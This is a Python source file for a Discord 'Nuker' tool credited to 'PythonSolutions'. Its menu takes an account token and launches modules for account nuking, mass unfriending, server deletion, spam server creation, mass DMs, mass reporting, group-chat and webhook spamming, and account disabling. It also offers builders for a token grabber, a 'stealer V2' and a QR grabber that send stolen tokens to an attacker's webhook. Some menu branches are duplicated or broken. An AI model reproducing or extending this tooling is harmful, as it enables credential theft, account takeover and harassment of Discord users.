
import requests, threading, os

from time import sleep
from colorama import Fore, Style, init

# I know you can import the modules alot better but just got so many issues with importing * so just did this instead
from util.plugins.common import clear, setTitle, getheaders, THIS_VERSION, proxy_scrape
import util.accountNuke
import util.dmdeleter
import util.info
import util.login
import util.groupchat_spammer
import util.massreport
import util.seizure
import util.server_leaver
import util.spamservers
import util.statuschanger
import util.tokendisable
import util.create_token_grabber
import util.massdm
import util.webhookspammer
init(convert=True)

def main() -> object:
    setTitle(f"PythonSolutions Nuker 1.0 ")
    global threads
    threads = 0
    clear()
    # Main banner
    banner = Style.BRIGHT + f'''{Fore.MAGENTA}                                                         
 $$$$$$\            $$\             $$\     $$\                               
$$  __$$\           $$ |            $$ |    \__|                              
$$ /  \__| $$$$$$\  $$ |$$\   $$\ $$$$$$\   $$\  $$$$$$\  $$$$$$$\   $$$$$$$\ 
\$$$$$$\  $$  __$$\ $$ |$$ |  $$ |\_$$  _|  $$ |$$  __$$\ $$  __$$\ $$  _____|
 \____$$\ $$ /  $$ |$$ |$$ |  $$ |  $$ |    $$ |$$ /  $$ |$$ |  $$ |\$$$$$$\  
$$\   $$ |$$ |  $$ |$$ |$$ |  $$ |  $$ |$$\ $$ |$$ |  $$ |$$ |  $$ | \____$$\ 
\$$$$$$  |\$$$$$$  |$$ |\$$$$$$  |  \$$$$  |$$ |\$$$$$$  |$$ |  $$ |$$$$$$$  |
 \______/  \______/ \__| \______/    \____/ \__| \______/ \__|  \__|\_______/
created by https://github.com/PythonSolutions
                             '''.replace('█', f'{Fore.WHITE}█{Fore.LIGHTGREEN_EX}') + f'''   
{Fore.MAGENTA}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}
{Fore.RESET}[{Fore.WHITE}1{Fore.RESET}]{Fore.MAGENTA} Nuke Account                                |{Fore.RESET}[{Fore.WHITE}10{Fore.RESET}]{Fore.MAGENTA} Disable Account
{Fore.RESET}[{Fore.WHITE}2{Fore.RESET}]{Fore.MAGENTA} Unfriend all friends                        |{Fore.RESET}[{Fore.WHITE}11{Fore.RESET}]{Fore.MAGENTA} Status Changer
{Fore.RESET}[{Fore.WHITE}3{Fore.RESET}]{Fore.MAGENTA} Delete and leave all servers                |{Fore.RESET}[{Fore.WHITE}12{Fore.RESET}]{Fore.MAGENTA} Create Token Grabber 
{Fore.RESET}[{Fore.WHITE}4{Fore.RESET}]{Fore.MAGENTA} Spam Create New servers                     |{Fore.RESET}[{Fore.WHITE}13{Fore.RESET}]{Fore.MAGENTA} Mass Report
{Fore.RESET}[{Fore.WHITE}5{Fore.RESET}]{Fore.MAGENTA} Dm Deleter                                  |{Fore.RESET}[{Fore.WHITE}14{Fore.RESET}]{Fore.MAGENTA} GroupChat Spammer
{Fore.RESET}[{Fore.WHITE}6{Fore.RESET}]{Fore.MAGENTA} Mass Dm                                     |{Fore.RESET}[{Fore.WHITE}15{Fore.RESET}]{Fore.MAGENTA} Exit
{Fore.RESET}[{Fore.WHITE}7{Fore.RESET}]{Fore.MAGENTA} Webhook Destroyer                          
{Fore.RESET}[{Fore.WHITE}8{Fore.RESET}]{Fore.MAGENTA} Get information from a targetted account    
{Fore.RESET}[{Fore.WHITE}9{Fore.RESET}]{Fore.MAGENTA} Log into an account                         
{Fore.MAGENTA}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Style.RESET_ALL}'''
    print(banner)
    choice = str(input(
            f'{Fore.MAGENTA}[{Fore.WHITE}>>>{Fore.MAGENTA}] {Fore.RESET}Choice: {Fore.LIGHTRED_EX}'))
    #options LOL
    if choice == '1':
        token = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        Server_Name = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Name of the servers that will be created: {Fore.LIGHTRED_EX}'))
        message_Content = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.accountNuke.Solution_Nuke, args=(token, Server_Name, message_Content)).start()
                return
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '2':
        token = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.unfriender.UnFriender, args=(token, )).start()
                return
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '3':
        token = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.server_leaver.Leaver, args=(token, )).start()
                return
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '4':
        token = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        Server_Name = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Name of the servers that will be created: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.spamservers.SpamServers, args=(token, Server_Name)).start()
                return
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '5':
        token = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.dmdeleter.DmDeleter, args=(token, )).start()
                return
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '6':
        token = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        Message = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.massdm.MassDM, args=(token, Message)).start()
                return
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '':
        token = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.seizure.StartSeizure, args=(token, )).start()
                return
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '8':
        token = str(input(
        f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        util.info.Info(token)

    elif choice == '9':
        token = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.login.TokenLogin, args=(token, )).start()
                return                
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '10':
        token = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            util.tokendisable.TokenDisable(token)
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '11':
        token = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        Status = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Custom Status: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            util.statuschanger.StatusChanger(token, Status)
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '12':
        WebHook = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook Url: {Fore.LIGHTRED_EX}'))
        fileName = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}File name: {Fore.LIGHTRED_EX}'))
        try:
            responce = requests.get(
                WebHook)
            if responce.status_code != 200:
                print("\nInvalid Webhook")
                sleep(1)
                main()
        except Exception as e:
            print(f"an error occured\nignoring: {e}")
            sleep(4)
            main()
        util.create_token_grabber.TokenGrabber(WebHook, fileName)

    elif choice == '12':
        WebHook = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook Url: {Fore.LIGHTRED_EX}'))
        fileName = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}File name: {Fore.LIGHTRED_EX}'))
        try:
            responce = requests.get(
                WebHook)
            if responce.status_code != 200:
                print("\nInvalid Webhook")
                sleep(1)
                main()
        except Exception as e:
            print(f"an error occured\nignoring: {e}")
            sleep(4)
            main()
        util.create_stealer_V2.TokenGrabberV2(WebHook, fileName)

    elif choice == '':
        WebHook = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook Url: {Fore.LIGHTRED_EX}'))
            
        try:
            responce = requests.get(
                WebHook)
            if responce.status_code != 200:
                print("\nInvalid Webhook")
                sleep(1)
                main()
        except Exception as e:
            print(f"an error occured\nignoring: {e}")
            sleep(4)
            main()
        util.QR_Grabber.QR_Grabber(WebHook)


    elif choice == '13':
        print(f"\n{Fore.LIGHTRED_EX}(the token you input is the account that will send the reports){Fore.RESET}")
        token = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        guild_id1 = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Server ID: {Fore.LIGHTRED_EX}'))
        channel_id1 = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Channel ID: {Fore.LIGHTRED_EX}'))
        message_id1 = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message ID: {Fore.LIGHTRED_EX}'))
        reason1 = str(input(
            '\n[1] Illegal content\n'
            '[2] Harassment\n'
            '[3] Spam or phishing links\n'
            '[4] Self-harm\n'
            '[5] NSFW content\n\n'

            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Reason: {Fore.LIGHTRED_EX}'))
        if reason1.upper() in ('1', 'ILLEGAL CONTENT'):
            reason1 = 0
        elif reason1.upper() in ('2', 'HARASSMENT'):
            reason1 = 1
        elif reason1.upper() in ('3', 'SPAM OR PHISHING LINKS'):
            reason1 = 2
        elif reason1.upper() in ('4', 'SELF-HARM'):
            reason1 = 3
        elif reason1.upper() in ('5', 'NSFW CONTENT'):
            reason1 = 4
        else:
            print(f"\nInvalid reason")
            sleep(1)
            main()

        r = requests.get('https://discord.com/api/v9/users/@me' ,headers=getheaders(token))
        if r.status_code == 200:
            clear()
            util.massreport.MassReport(token, guild_id1, channel_id1, message_id1, reason1)
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == "14":
        token = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            util.groupchat_spammer.GcSpammer(token)
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main() 


    elif choice == '7':
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Webhook Deleter
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Webhook Spammer    
                        ''')
        secondchoice = int(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Second Choice: {Fore.LIGHTRED_EX}'))

        if secondchoice not in [1, 2]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Second Choice')
            sleep(1)
            main()

        if secondchoice == 1:
            WebHook = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.LIGHTRED_EX}'))
            try:
                responce = requests.get(
                    WebHook)
                if responce.status_code != 200:
                    print("\nInvalid Webhook")
                    sleep(1)
                    main()
            except Exception as e:
                print(f"an error occured\nignoring: {e}")
                sleep(4)
                main()

            try:
                requests.delete(WebHook)
                print(f'\n{Fore.GREEN}Webhook Successfully Deleted!{Fore.RESET}\n')
            except Exception as e:
                print(f'{Fore.RED}Error: {Fore.WHITE}{e} {Fore.RED}happened while trying to delete the Webhook')
            choice = str(input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.LIGHTRED_EX}'))
            main()

        if secondchoice == 2:
            WebHook = str(input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.LIGHTRED_EX}'))
            Message = str(input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message: {Fore.LIGHTRED_EX}'))
            Timer = str(input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Amount of time for the spam (sec): {Fore.LIGHTRED_EX}'))
            try:
                responce = requests.get(
                    WebHook)
                if responce.status_code != 200:
                    print("\nInvalid Webhook")
                    sleep(1)
                    main()
            except Exception as e:
                print(f"an error occured\nignoring: {e}")
                sleep(4)
                main()
            util.webhookspammer.WebhookSpammer(WebHook, Message, Timer)


    elif choice == '15':
        setTitle("Exiting...")
        choice = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Are you sure you want to exit? (Y to confirm): {Fore.LIGHTRED_EX}'))
        if choice.upper() == 'Y':
            clear()
            Style.RESET_ALL
            Fore.RESET
            exit()
        else:
            main()
    else:
        clear()
        main()

if __name__ == "__main__":

    with open(os.getenv("temp" ) +"\\proxies.txt", 'w'): pass
    clear()
    proxy_scrape()
    sleep(1)
    main()
